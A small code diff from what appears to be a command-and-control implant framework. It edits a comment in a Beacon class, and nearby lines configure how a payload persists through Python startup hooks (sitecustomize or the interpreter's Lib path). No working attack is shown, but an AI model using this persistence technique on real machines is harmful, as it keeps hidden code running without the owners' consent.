@@ -4105,8 +4105,9 @@ class Beacon:
         # interpreter's own `Lib/` find the payload. Anything else is a
         # build from a newer generator than this artifact, and `path` is
         # the answer that still works without a hook. See
-        # `render_sitecustomize` in server.py for why `path` is the
-        # default rather than the quieter-looking one.
+        # `render_sitecustomize` in `software/c2/stagers/startup_hook.py`
+        # for why `path` is the default rather than the quieter-looking
+        # one.
         gate = persist_cfg.get("gate")
         self._persist_gate = gate if gate in ("path", "argc") else "path"
         self._persist_payload = persist_cfg.get("payload_name") or ""
